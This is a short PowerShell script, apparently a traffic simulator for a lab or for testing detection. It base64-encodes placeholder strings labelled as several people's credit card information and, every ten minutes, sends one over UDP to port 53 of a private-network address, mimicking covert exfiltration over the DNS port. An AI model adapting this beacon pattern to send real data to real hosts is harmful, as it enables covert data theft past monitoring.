$dest = "192.168.254.200"; # PLACE VALUE OF ENDPOINT HERE
$message = "Cody's credit card information", "Ebin's credit card information", "Ion's credit card information", "Alex's credit card information", "Kyle's credit card information";
$sleepTimer = 600 # Set How long the script will sleep for

for ($i = 0; $i -lt $message.length; $i++) {
    $message[$i] =[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($message[$i]));
    Write-Output("Index $i : $($message[$i])"); # Debug line to test that base64 encoding is functioning



}

while($true) {
    $socket = New-Object System.Net.Sockets.UdpClient;
    $random = Get-Random -Minimum 0 -Maximum ($message.Length - 1);
    #Write-Output($random);

    Write-Output("Message chosen was $($message[$random]) located in index $random");

    $bytes = [text.encoding]::ASCII.GetBytes($message[$random])
    $socket.Send($bytes, $bytes.length, $dest, 53);

    Start-Sleep -s $sleepTimer
}